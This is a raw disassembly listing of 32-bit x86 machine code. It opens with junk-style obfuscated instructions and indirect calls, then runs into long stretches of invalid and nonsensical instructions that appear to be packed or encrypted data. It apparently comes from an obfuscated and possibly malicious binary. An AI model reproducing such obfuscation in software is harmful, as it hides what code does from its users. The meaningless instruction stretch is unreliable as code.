  4198ba:	not    DWORD PTR ds:0x4282d3
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42811f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dcc
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428243
  4198e5:	and    DWORD PTR ds:0x4282db,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282af
  4198f1:	sbb    DWORD PTR ds:0x428137,edx
  4198f7:	or     DWORD PTR ds:0x4282c7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428233,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x4281df
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x4281e3
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x4282d7,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x4281eb,0x4551
  419946:	mov    DWORD PTR ds:0x42824f,0x487
  419950:	cmp    DWORD PTR ds:0x4282d7,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428dd0
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282af,0x75a
  419988:	sub    DWORD PTR ds:0x428257,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x4281fb
  419999:	sub    ecx,DWORD PTR ds:0x42835f
  41999f:	mov    DWORD PTR ds:0x4281fb,ecx
  4199a5:	cmp    DWORD PTR ds:0x42821b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282b3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42811b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428337,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42821b,edi
  4199da:	cmp    DWORD PTR ds:0x42821b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x4281f3
  4199ec:	push   0x427f1b
  4199f1:	call   DWORD PTR ds:0x428e60
  4199f7:	sub    DWORD PTR ds:0x428367,ecx
  4199fd:	mov    ecx,DWORD PTR ds:0x4282df
  419a03:	sbb    DWORD PTR ds:0x428267,ecx
  419a09:	adc    edx,DWORD PTR ds:0x42834b
  419a0f:	and    edx,0x987
  419a15:	adc    DWORD PTR ds:0x4282c7,0x29fb
  419a1f:	sbb    ecx,edx
  419a21:	xor    DWORD PTR ds:0x4282bf,edi
  419a27:	xor    DWORD PTR [esp+0x40],eax
  419a2b:	mov    ebx,DWORD PTR ds:0x4282d7
  419a31:	xor    DWORD PTR ds:0x4281eb,ebx
  419a37:	mov    DWORD PTR [esp+0x30],0x5b3d
  419a3f:	add    edx,0x5f01
  419a45:	mov    DWORD PTR [esp+0x34],0x4445
  419a4d:	sub    eax,DWORD PTR ds:0x4281ef
  419a53:	mov    DWORD PTR [esp+0x10],0xa52
  419a5b:	mov    DWORD PTR [esp+0x14],0x1c69
  419a63:	mov    eax,DWORD PTR [esp+0x10]
  419a67:	jmp    0x419e36
  419a6c:	xchg   DWORD PTR [edi-0x63e03bea],ebp
  419a72:	inc    edx
  419a73:	sub    bh,BYTE PTR [edx-0x6f8f7006]
  419a79:	mov    al,ds:0xbbe3aa25
  419a7e:	push   ss
  419a7f:	sbb    BYTE PTR [edx+edx*1+0x3fa01818],bh
  419a86:	inc    eax
  419a87:	daa    
  419a88:	outs   dx,DWORD PTR ds:[esi]
  419a89:	ss mov ecx,0x8e2c0705
  419a8f:	and    BYTE PTR [ebx],dh
  419a91:	lods   eax,DWORD PTR ds:[esi]
  419a92:	cmp    al,0x17
  419a94:	fldenv [edx-0x4c]
  419a97:	out    0x45,eax
  419a99:	push   ss
  419a9a:	xchg   BYTE PTR [esi+ecx*2],ah
  419a9d:	add    eax,0xa54a78e
  419aa2:	fnstcw WORD PTR [ebx+esi*1+0x1dfde1ed]
  419aa9:	in     al,dx
  419aaa:	inc    ebp
  419aab:	scas   al,BYTE PTR es:[edi]
  419aac:	ret    
  419aad:	xor    BYTE PTR [edi-0x4043bcf0],cl
  419ab3:	lea    edi,[eax-0x7d86081f]
  419ab9:	test   al,0xa
  419abb:	ficomp WORD PTR [edx]
  419abd:	in     al,dx
  419abe:	push   eax
  419abf:	ins    DWORD PTR es:[edi],dx
  419ac0:	cdq    
  419ac1:	adc    bh,BYTE PTR [edi+0x29dfcb8f]
  419ac7:	loope  0x419a4b
  419ac9:	adc    DWORD PTR [edi-0x6f5bcf90],ebp
  419acf:	xchg   BYTE PTR [esi-0x37f7fc61],dl
  419ad5:	fld    DWORD PTR [ebx]
  419ad7:	stos   DWORD PTR es:[edi],eax
  419ad8:	stos   BYTE PTR es:[edi],al
  419ad9:	pop    es
  419ada:	pop    es
  419adb:	jae    0x419aa0
  419add:	xchg   ebp,ebx
  419adf:	out    dx,eax
  419ae0:	sub    al,0x45
  419ae2:	aaa    
  419ae3:	lds    edi,FWORD PTR [edi+0x69]
  419ae6:	rcr    BYTE PTR [edi+eax*1-0x73],0xc8
  419aeb:	sti    
  419aec:	lds    ecx,FWORD PTR [esi-0x4d]
  419aef:	imul   esi,edi,0x79
  419af2:	adc    cl,BYTE PTR [edx+ecx*1-0x4b7b0779]
  419af9:	mov    ebx,0xe16a4384
  419afe:	(bad)  
  419aff:	pop    esi
  419b00:	gs dec eax
  419b02:	call   0xe91b94ae
  419b07:	ret    0xf069
  419b0a:	xor    eax,0x5cb39d1
  419b0f:	pop    esp
  419b10:	mov    cl,0x36
  419b12:	punpcklbw mm7,DWORD PTR [edx+0x6c78005c]
  419b19:	mov    bh,0x60
  419b1b:	imul   esi,DWORD PTR [ebp+ecx*4-0x3b904046],0x19729e22
  419b26:	or     eax,0x19f91a30
  419b2b:	adc    dh,BYTE PTR [esi-0x14]
  419b2e:	aam    0x29
  419b30:	cwde   
  419b31:	mov    dh,0x3f
  419b33:	mov    ah,BYTE PTR [edx-0x50]
  419b36:	add    BYTE PTR [eax+edx*2-0x1f],ch
  419b3a:	in     eax,0xf6
  419b3c:	mov    edi,0x5810e33a
  419b41:	int    0xef
  419b43:	jmp    0x419b66
  419b45:	push   ebp
  419b46:	stos   DWORD PTR es:[edi],eax
  419b47:	add    ah,bl
  419b49:	xchg   esi,eax
  419b4a:	dec    ecx
  419b4b:	(bad)  
  419b4c:	push   0x54d42777
  419b51:	cmp    esp,ebp
  419b53:	inc    edx
  419b54:	xchg   ecx,eax
  419b55:	(bad)  
  419b57:	xchg   edi,eax
  419b58:	push   esi
  419b59:	in     al,dx
  419b5a:	loope  0x419bd2
  419b5c:	sbb    al,0xbd
  419b5e:	in     al,0x9f
  419b60:	add    DWORD PTR [ecx-0x5e12d66f],eax
  419b66:	push   ds
  419b67:	xchg   ebp,eax
  419b68:	ret    0xede6
  419b6b:	aam    0x9b
  419b6d:	dec    edx
  419b6e:	int3   
  419b6f:	(bad)  
  419b70:	cmp    esi,DWORD PTR [ebp-0x699160d8]
  419b76:	jb     0x419b56
  419b78:	shl    DWORD PTR [edi+0x5b76406a],cl
  419b7e:	ds push 0x39
  419b81:	push   ebp
  419b82:	push   eax
  419b83:	loope  0x419bdb
  419b85:	inc    edx
  419b86:	cwde   
  419b87:	out    dx,al
  419b88:	iret   
  419b89:	(bad)  
  419b8a:	xor    DWORD PTR ds:0x9684c8c4,ebx
  419b90:	call   0xffc27e10
  419b95:	inc    ebx
  419b96:	xor    BYTE PTR [eax+0x1c980d23],0xef
  419b9d:	push   cs
  419b9e:	inc    ebp
  419b9f:	cwde   
  419ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ba1:	cld    
  419ba2:	mov    edx,0x8c227b79
  419ba7:	ret    
  419ba8:	sbb    ch,BYTE PTR [edi-0xa]
  419bab:	cs cmp al,0x5a
  419bae:	mov    ah,0xda
  419bb0:	sbb    bh,BYTE PTR [ebp-0x4ce9284f]
  419bb6:	sub    BYTE PTR [esi-0x4e],bh
  419bb9:	xchg   esp,eax
  419bba:	xlat   BYTE PTR ds:[ebx]
  419bbb:	dec    esi
  419bbc:	fcom   DWORD PTR [ecx-0x476313ae]
  419bc2:	fistp  DWORD PTR [esi]
  419bc4:	hlt    
  419bc5:	lods   al,BYTE PTR ds:[esi]
  419bc6:	hlt    
  419bc7:	push   eax
  419bc8:	mov    bh,0xd3
  419bca:	lock outs dx,BYTE PTR ds:[esi]
  419bcc:	adc    bl,al
  419bce:	cs stos BYTE PTR es:[edi],al
  419bd0:	sbb    al,BYTE PTR [ecx+0x7]
  419bd3:	std    
  419bd4:	pop    ecx
  419bd5:	mov    edx,0x3a558fb9
  419bda:	add    DWORD PTR [edx+0x1d183b14],0x6b6378fd
  419be4:	and    al,0xf0
  419be6:	daa    
  419be7:	sub    eax,0x95c95821
  419bec:	fsubr  DWORD PTR [ebx+0x28d0f30d]
  419bf2:	or     edx,DWORD PTR ds:0x3a50face
  419bf8:	int    0x0
  419bfa:	pop    esp
  419bfb:	mov    edx,0x1ffb18e6
  419c00:	hlt    
  419c01:	add    cl,BYTE PTR [esi+ebx*1-0x6e784704]
  419c08:	loop   0x419b9c
  419c0a:	fs and eax,0xc94eb451
  419c10:	and    esi,DWORD PTR [edx]
  419c12:	lods   eax,DWORD PTR ds:[esi]
  419c13:	mov    ecx,0x5b82df78
  419c18:	pop    esp
  419c19:	cmc    
  419c1a:	fsub   QWORD PTR [ebx-0x6e]
  419c1d:	push   edi
  419c1e:	or     ah,0xbb
  419c21:	outs   dx,DWORD PTR ds:[esi]
  419c22:	xchg   ecx,eax
  419c23:	pop    esp
  419c24:	fistp  WORD PTR [eax]
  419c26:	push   esp
  419c27:	pop    esi
  419c28:	inc    ebp
  419c29:	and    al,BYTE PTR [edx+0xb]
  419c2c:	test   eax,0x8df9c3d9
  419c31:	sub    ecx,DWORD PTR [edi]
  419c33:	adc    esi,DWORD PTR [esi]
  419c35:	popf   
  419c36:	scas   al,BYTE PTR es:[edi]
  419c37:	xchg   esi,eax
  419c38:	aas    
  419c39:	icebp  
  419c3a:	hlt    
  419c3b:	js     0x419c41
  419c3d:	int    0xc7
  419c3f:	(bad)  
  419c40:	dec    ebx
  419c41:	mov    ebp,0x7556c05d
  419c46:	call   FWORD PTR [ebx+ebp*4]
  419c49:	out    0xb5,al
  419c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c4c:	xor    esp,DWORD PTR [esp+eiz*8+0x49d79eeb]
  419c53:	sbb    eax,0x10123b5c
  419c58:	or     ebp,edi
  419c5a:	jp     0x419c38
  419c5c:	es aas 
  419c5e:	aas    
  419c5f:	dec    ebx
  419c60:	mov    ebx,0x50f56815
  419c65:	push   ecx
  419c66:	lods   al,BYTE PTR ds:[esi]
  419c67:	adc    eax,0xa93217dd
  419c6c:	jg     0x419bf9
  419c6e:	nop
  419c6f:	test   BYTE PTR [edx+0x62],0x67
  419c73:	mov    ebx,0xe4ed3a0f
  419c78:	scas   eax,DWORD PTR es:[edi]
  419c79:	imul   esp,DWORD PTR [edi+ebx*1+0x2f331c5a],0xffffffd9
  419c81:	and    al,0x92
  419c83:	fidiv  DWORD PTR [edx]
  419c85:	push   esi
  419c86:	sub    DWORD PTR [eax+0x21],esp
  419c89:	xor    eax,DWORD PTR [edi-0x1feb0a9e]
  419c8f:	inc    eax
  419c90:	das    
  419c91:	pop    esp
  419c92:	mov    ds:0xd1499132,al
  419c97:	scas   al,BYTE PTR es:[edi]
  419c98:	pop    esi
  419c99:	mov    bh,0x59
  419c9b:	inc    ecx
  419c9c:	mov    ecx,0xa0458b63
  419ca1:	push   ecx
  419ca2:	lds    ecx,FWORD PTR [edi]
  419ca4:	cmp    al,0xd2
  419ca6:	hlt    
  419ca7:	push   0x8b349e92
  419cac:	rcr    BYTE PTR [ecx-0x774e2ee4],1
  419cb2:	sahf   
  419cb3:	adc    dl,BYTE PTR [edx-0x3799500c]
  419cb9:	inc    esp
  419cba:	xchg   BYTE PTR ds:0xdb6f0e5,ch
  419cc0:	sbb    BYTE PTR [esi-0x39f3baa6],0x69
  419cc7:	ss push edi
  419cc9:	pop    ebp
  419cca:	add    edx,DWORD PTR [esi+edi*8+0x3b]
  419cce:	dec    ecx
  419ccf:	(bad)  
  419cd0:	mov    bh,0xc2
  419cd2:	adc    BYTE PTR [edx+0x46bcfe86],al
  419cd8:	mov    al,0xf8
  419cda:	inc    ecx
  419cdb:	icebp  
  419cdc:	test   al,0xe8
  419cde:	cmp    dh,BYTE PTR [edx+edx*2-0x75fc8adf]
  419ce5:	ds std 
  419ce7:	fnstcw WORD PTR [esi-0x10]
  419cea:	enter  0xd71e,0x8e
  419cee:	mov    edi,0x6dfdc7bb
  419cf3:	cli    
  419cf4:	mov    WORD PTR [esi],?
  419cf6:	popf   
  419cf7:	xchg   edx,eax
  419cf8:	icebp  
  419cf9:	sub    dl,dl
  419cfb:	loope  0x419c8d
  419cfd:	mov    ecx,0x4b233f6d
  419d02:	sub    bh,BYTE PTR [esi-0x99154d2]
  419d08:	sbb    eax,0x285f1402
  419d0d:	out    0x9f,eax
  419d0f:	or     DWORD PTR [ecx+0x25],0xffffff87
  419d13:	push   edi
  419d14:	pushf  
  419d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d16:	mov    edi,0x9ea1e510
  419d1b:	mov    gs,ecx
  419d1d:	xchg   ebp,eax
  419d1e:	jge    0x419d23
  419d20:	mov    ds:0x21e0c750,eax
  419d25:	ds popf 
  419d27:	adc    al,0x72
  419d29:	xchg   edi,eax
  419d2a:	sbb    edx,edx
  419d2c:	neg    BYTE PTR [ebx+0x7fc49a4c]
  419d32:	rol    BYTE PTR [edx-0x6c],0xb3
  419d36:	ins    BYTE PTR es:[edi],dx
  419d37:	add    dh,0x79
  419d3a:	fdiv   QWORD PTR [edi+0x8]
  419d3d:	retf   
  419d3e:	aad    0x78
  419d40:	and    BYTE PTR [edx+0x5c839ebb],bl
  419d46:	daa    
  419d47:	xor    ecx,ebx
  419d49:	in     al,dx
  419d4a:	jnp    0x419d90
  419d4c:	repz add eax,0xf188411f
  419d52:	shl    BYTE PTR [ebx+0x2f8d6edb],cl
  419d58:	ins    BYTE PTR es:[edi],dx
  419d59:	lea    ebx,[edx]
  419d5b:	sub    DWORD PTR [esi-0x3e],ebp
  419d5e:	sbb    DWORD PTR [esi-0x38],esp
  419d61:	cmp    BYTE PTR [ebp+ecx*1-0x34e4159f],cl
  419d68:	cmc    
  419d69:	jmp    0x419da1
  419d6b:	mov    eax,ds:0x3dc6810b
  419d70:	add    al,0x30
  419d72:	iret   
  419d73:	add    al,0x6e
  419d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d76:	add    bl,bl
  419d78:	cmc    
  419d79:	or     BYTE PTR [ebx],al
  419d7b:	out    dx,al
  419d7c:	in     eax,0x1f
  419d7e:	xor    bh,BYTE PTR ds:[edi]
  419d81:	xchg   esp,eax
  419d82:	cmp    dh,BYTE PTR [eax]
  419d84:	and    al,0x6f
  419d86:	jae    0x419d64
  419d88:	ret    0xf23f
  419d8b:	push   esi
  419d8c:	lahf   
  419d8d:	inc    edi
  419d8e:	ins    BYTE PTR es:[edi],dx
  419d8f:	cmp    al,0x7d
  419d91:	push   eax
  419d92:	and    BYTE PTR [ecx-0x2e],dh
  419d95:	aam    0x50
  419d97:	and    DWORD PTR [ebp+edi*4-0x7ea9a4a5],esi
  419d9e:	push   eax
  419d9f:	dec    esp
  419da0:	lea    edx,[ebp-0x7f]
  419da3:	scas   eax,DWORD PTR es:[edi]
  419da4:	sbb    DWORD PTR [ecx],ecx
  419da6:	cld    
  419da7:	sti    
  419da8:	dec    esp
  419da9:	and    ebp,DWORD PTR ds:0x4040f51a
  419daf:	add    ebp,DWORD PTR [esi]
  419db1:	in     al,dx
  419db2:	popa   
  419db3:	loopne 0x419da0
  419db5:	mov    cl,0x16
  419db7:	push   ss
  419db8:	stos   DWORD PTR es:[edi],eax
  419db9:	adc    eax,0x146cab7e
  419dbe:	addr16 pop es
  419dc0:	retf   0xcfc3
  419dc3:	jecxz  0x419dc4
  419dc5:	retf   0x2a6d
  419dc8:	jo     0x419e16
  419dca:	fmulp  st(3),st
  419dcc:	push   0xfffffff5
  419dce:	cwde   
  419dcf:	push   eax
  419dd0:	add    BYTE PTR [eax*1+0x63fbd58a],cl
  419dd7:	dec    eax
  419dd8:	pop    esp
  419dd9:	and    DWORD PTR [esi+0xc919f5e],esp
  419ddf:	push   esp
  419de0:	fadd   QWORD PTR [esi]
  419de2:	imul   BYTE PTR ds:0xd3a347f7
  419de8:	iret   
  419de9:	cwde   
  419dea:	fwait
  419deb:	xor    BYTE PTR [esi+0x31],dh
  419dee:	dec    edx
  419def:	adc    esp,DWORD PTR [ebx-0x231bad1f]
  419df5:	retf   0xc727
  419df8:	jge    0x419e14
  419dfa:	enter  0x2aa3,0x3
  419dfe:	int3   
  419dff:	outs   dx,BYTE PTR ds:[esi]
  419e00:	mov    es,WORD PTR [ecx+0x7a856454]
  419e06:	push   esi
  419e07:	aad    0xcd
  419e09:	(bad)  
  419e0a:	out    dx,al
  419e0b:	cdq    
  419e0c:	loop   0x419e6e
  419e0e:	xor    dl,al
  419e10:	cmp    al,al
  419e12:	es popa 
  419e14:	hlt    
  419e15:	sar    esp,cl
  419e17:	inc    esp
  419e18:	push   ss
  419e19:	dec    eax
  419e1a:	cmp    dh,ah
  419e1c:	fdiv   QWORD PTR [ebx+ecx*8]
  419e1f:	test   DWORD PTR [ebp-0x39cc3096],0xbec6ddb2
  419e29:	popf   
  419e2a:	or     ecx,DWORD PTR [ecx-0x3a]
  419e2d:	xchg   ebp,eax
  419e2e:	mov    dl,0x4
  419e30:	ss or  ebp,edx
  419e33:	or     eax,0x4c8b3d74
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0xaa147841
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	loope  0x419eca
  419e70:	(bad)  
  419e71:	sub    DWORD PTR [eax+0x54],ebx
  419e74:	lds    esi,FWORD PTR [ecx+0x710c7f8e]
  419e7a:	clc    
  419e7b:	pop    es
  419e7c:	jbe    0x419edc
  419e7e:	inc    edi
  419e7f:	mov    ah,0x6a
  419e81:	push   ebp
  419e82:	mov    ebx,esp
  419e84:	scas   al,BYTE PTR es:[edi]
  419e85:	(bad)  
  419e86:	sub    ah,bl
  419e88:	xchg   esp,eax
  419e89:	mov    edx,0xf909ae2c
  419e8e:	jmp    0x3e64:0x8b42d59c
  419e95:	mov    esi,0xff731144
  419e9a:	mov    eax,0x37d5d95f
  419e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea0:	sbb    al,0xfd
  419ea2:	jl     0x419e57
  419ea4:	retf   
  419ea5:	fmul   st,st(4)
  419ea7:	cmp    DWORD PTR [edx+0x27ffa346],ebx
  419ead:	sub    DWORD PTR [esi+0x3c],ebx
  419eb0:	not    BYTE PTR ds:0x59883242
  419eb6:	js     0x419e93
  419eb8:	ror    edi,1
  419eba:	sbb    ah,BYTE PTR [edi+0xf]
  419ebd:	push   esi
  419ebe:	popf   
  419ebf:	test   DWORD PTR [eax-0x4b],eax
  419ec2:	mov    bh,0x8b
  419ec4:	idiv   BYTE PTR [eax-0x6d8b8f8d]
  419eca:	jl     0x419e61
  419ecc:	mov    DWORD PTR [edi-0x9d0fac0],edx
  419ed2:	cmp    DWORD PTR [esi-0x2a69dd99],ebp
  419ed8:	xor    eax,0xf73e8a44
  419edd:	adc    edx,ebx
  419edf:	inc    esp
  419ee0:	je     0x419e81
  419ee2:	lods   al,BYTE PTR ds:[esi]
  419ee3:	sub    bl,BYTE PTR [edi+0x67]
  419ee6:	sub    edi,DWORD PTR [ebp+0x40]
  419ee9:	pop    ebp
  419eea:	and    al,0x2c
  419eec:	imul   esp
  419eee:	cli    
  419eef:	mov    al,0x74
  419ef1:	fst    QWORD PTR [esi-0x69]
  419ef4:	xchg   esp,eax
  419ef5:	rcl    bh,cl
  419ef7:	pusha  
  419ef8:	daa    
  419ef9:	loop   0x419f26
  419efb:	sbb    DWORD PTR [esi],ebp
  419efd:	stc    
  419efe:	ffree  st(2)
  419f00:	std    
  419f01:	push   0x32950fee
  419f06:	push   cs
  419f07:	mov    edx,DWORD PTR [edx+0x7ff6fcb3]
  419f0d:	int3   
  419f0e:	fst    QWORD PTR cs:[edx+0x21]
  419f12:	xor    DWORD PTR [ebx+0x566242bb],0xffffffa8
  419f19:	xchg   edx,eax
  419f1a:	ins    DWORD PTR es:[edi],dx
  419f1b:	icebp  
  419f1c:	popf   
  419f1d:	push   esi
  419f1e:	in     eax,0xe7
  419f20:	push   0xffffff88
  419f22:	repz xchg ebp,eax
  419f24:	mov    eax,DWORD PTR [esi]
  419f26:	popf   
  419f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f28:	adc    esi,DWORD PTR [edi-0x204a23db]
  419f2e:	xchg   edi,eax
  419f2f:	mov    ds:0x77c8721d,al
  419f34:	popa   
  419f35:	sbb    BYTE PTR [esi+esi*4-0x32fc2409],ch
  419f3c:	push   0x19
  419f3e:	push   eax
  419f3f:	pop    ss
  419f40:	in     al,dx
  419f41:	enter  0xc783,0xd2
  419f45:	mov    eax,ds:0x9349be7c
  419f4a:	pop    esp
  419f4b:	ror    BYTE PTR [eax+ecx*1-0x63],1
  419f4f:	dec    eax
  419f50:	je     0x419f71
  419f52:	pushf  
  419f53:	adc    ecx,DWORD PTR [esi-0xa]
  419f56:	sub    ecx,ecx
  419f58:	enter  0xfd35,0xf5
  419f5c:	aad    0x3f
  419f5e:	scas   al,BYTE PTR es:[edi]
  419f5f:	stc    
  419f60:	cld    
  419f61:	jp     0x419f45
  419f63:	(bad)  
  419f64:	xor    esp,edx
  419f66:	sar    BYTE PTR [ebx],cl
  419f68:	mov    esp,0x78722416
  419f6d:	or     al,0xe7
  419f6f:	inc    ecx
  419f70:	in     eax,dx
  419f71:	mov    ecx,DWORD PTR [esi+0x4f]
  419f74:	jbe    0x419f06
  419f76:	cdq    
  419f77:	xor    esi,edi
  419f79:	(bad)  
  419f7a:	xor    DWORD PTR [edx],ebx
  419f7c:	(bad)
  419f80:	aas    
  419f81:	scas   eax,DWORD PTR es:[edi]
  419f82:	loop   0x419ff3
  419f84:	sbb    BYTE PTR [edi-0x2d],0xee
  419f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f89:	outs   dx,DWORD PTR ds:[esi]
  419f8a:	jb     0x419f0d
  419f8c:	push   edi
  419f8d:	and    eax,0x104a0154
  419f92:	mov    eax,0x9ddb07db
  419f97:	fisub  WORD PTR [esi-0x3]
  419f9a:	dec    ebx
  419f9b:	fs push esi
  419f9d:	(bad)  
  419f9e:	push   ebx
  419f9f:	shl    DWORD PTR [ebx+eax*2+0x5fc3736],1
  419fa6:	cli    
  419fa7:	cmp    BYTE PTR [edi-0x1c4c5a3c],0x96
  419fae:	(bad)  
  419faf:	dec    ecx
  419fb0:	dec    ebp
  419fb1:	les    eax,FWORD PTR [eax+0x5aa53143]
  419fb7:	out    0xc1,al
  419fb9:	sahf   
  419fba:	push   esi
  419fbb:	mov    esp,0x1fa66c80
  419fc0:	sar    DWORD PTR [esp+ebx*2],1
  419fc3:	cmp    BYTE PTR [eax-0x65],dh
  419fc6:	jl     0x419fd4
  419fc8:	sbb    al,BYTE PTR [ebx-0x69]
  419fcb:	pop    ds
  419fcc:	test   eax,0x40bdd18c
  419fd1:	xchg   ebx,eax
  419fd2:	(bad)  
  419fd3:	(bad)  [esi]
  419fd5:	cli    
  419fd6:	cmp    al,0x4f
  419fd8:	test   bh,al
  419fda:	or     al,0xc2
  419fdc:	ret    0x9fd3
  419fdf:	mov    BYTE PTR [eax],cl
  419fe1:	adc    esi,eax
  419fe3:	or     eax,0x4ced27bf
  419fe8:	shl    DWORD PTR [edx],1
  419fea:	cld    
  419feb:	and    eax,0x8210a759
  419ff0:	fs dec sp
  419ff3:	adc    DWORD PTR [edx+edi*2-0x52ace7fe],ebp
  419ffa:	cmp    al,0xe1
  419ffc:	clc    
  419ffd:	or     esi,DWORD PTR [ecx+0x781b9009]
  41a003:	add    eax,0x9286c0f1
  41a008:	test   BYTE PTR ds:0xe7c0c4d5,bl
  41a00e:	hlt    
  41a00f:	sbb    eax,0x333a9399
  41a014:	leave  
  41a015:	mov    dh,0xf9
  41a017:	out    0xc0,al
  41a019:	dec    ebx
  41a01a:	mov    esi,0x694426fa
  41a01f:	sbb    cl,BYTE PTR [eax-0x77effefe]
  41a025:	pop    edx
  41a026:	inc    eax
  41a027:	pop    eax
  41a028:	mov    dh,0x6a
  41a02a:	push   cs
  41a02b:	retf   0xaee9
  41a02e:	xor    BYTE PTR ds:0x63a69dfe,bh
  41a034:	jmp    0x484bb8cb
  41a039:	out    dx,al
  41a03a:	sub    DWORD PTR [ebp+0x1e],0x25d645af
  41a041:	cld    
  41a042:	mov    dh,0x6c
  41a044:	adc    ch,dl
  41a046:	pop    ebx
  41a047:	sbb    cl,BYTE PTR [ebx]
  41a049:	xchg   ebx,eax
  41a04a:	pop    edx
  41a04b:	cdq    
  41a04c:	pop    ebp
  41a04d:	test   DWORD PTR [edi+edi*4],ebx
  41a050:	scas   eax,DWORD PTR es:[edi]
  41a051:	jge    0x419fe7
  41a053:	arpl   WORD PTR [eax-0x575046b1],bp
  41a059:	dec    esi
  41a05a:	popa   
  41a05b:	test   al,0xca
  41a05d:	xchg   edx,eax
  41a05e:	fcomp  DWORD PTR [esi-0x574d9835]
  41a064:	xor    BYTE PTR [ebp+0x37],al
  41a067:	enter  0x9d41,0x61
  41a06b:	jne    0x419ff1
  41a06d:	jmp    0x7785:0xf34aa3e6
  41a074:	ficomp DWORD PTR [edx]
  41a076:	inc    ebp
  41a077:	hlt    
  41a078:	gs aaa 
  41a07a:	ret    
  41a07b:	retf   
  41a07c:	fistp  QWORD PTR [edx-0x5d173a05]
  41a082:	leave  
  41a083:	add    DWORD PTR [ecx+0x25],ebp
  41a086:	xchg   ecx,eax
  41a087:	and    ch,BYTE PTR [esi]
  41a089:	push   ss
  41a08a:	arpl   WORD PTR [edi],sp
  41a08c:	inc    esi
  41a08d:	push   cs
  41a08e:	adc    edi,DWORD PTR [ecx-0x4e]
  41a091:	loop   0x41a021
  41a093:	push   0xbd3ffe03
  41a098:	sbb    DWORD PTR [edx-0x4ba9815b],eax
  41a09e:	ds enter 0x7b10,0xf1
  41a0a3:	mov    al,gs:0xa6a1049a
  41a0a9:	sbb    DWORD PTR [ebp+ecx*8+0x73],ebx
  41a0ad:	xchg   DWORD PTR [ebx+0x53],eax
  41a0b0:	sahf   
  41a0b1:	and    DWORD PTR [esi-0x4c856c1d],0x15
  41a0b8:	adc    eax,0xc0c3b5fb
  41a0bd:	loop   0x41a05b
  41a0bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c0:	xchg   DWORD PTR [eax-0x50a56ae6],edi
  41a0c6:	rcr    DWORD PTR [eax-0x6],0xbd
  41a0ca:	xor    cl,BYTE PTR [ebx-0x7a]
  41a0cd:	push   edi
  41a0ce:	fstp   QWORD PTR [ebp+0x2ac728e5]
  41a0d4:	ss xchg ecx,eax
  41a0d6:	xor    BYTE PTR [edi+0x3dc50527],0xc9
  41a0dd:	pop    ebp
  41a0de:	xchg   ecx,eax
  41a0df:	sbb    al,ah
  41a0e1:	push   ecx
  41a0e2:	inc    edi
  41a0e3:	mov    ?,WORD PTR [ebx-0x6d35af11]
  41a0e9:	mov    ah,0x31
  41a0eb:	pop    edx
  41a0ec:	push   ds
  41a0ed:	xor    esp,DWORD PTR [edi-0x9]
  41a0f0:	push   esi
  41a0f1:	test   DWORD PTR ds:0xb48311dc,esi
  41a0f7:	inc    ebp
  41a0f8:	and    bl,BYTE PTR [edi]
  41a0fa:	add    eax,DWORD PTR [edx]
  41a0fc:	pushf  
  41a0fd:	pop    ecx
  41a0fe:	ror    DWORD PTR [ecx+esi*1-0x51aa8363],cl
  41a105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a106:	std    
  41a107:	inc    eax
  41a108:	sub    DWORD PTR [ebp-0x28],0x45
  41a10c:	lods   eax,DWORD PTR ds:[esi]
  41a10d:	xor    eax,0x39f76939
  41a112:	(bad)  
  41a113:	je     0x41a0bc
  41a115:	jge    0x41a0bc
  41a117:	mov    al,ds:0x19d4be46
  41a11c:	enter  0x8916,0x60
  41a120:	mov    al,BYTE PTR [edi+0x3448eaa4]
  41a126:	cmp    eax,0xd29d25ea
  41a12b:	lahf   
  41a12c:	inc    eax
  41a12d:	jle    0x41a0c8
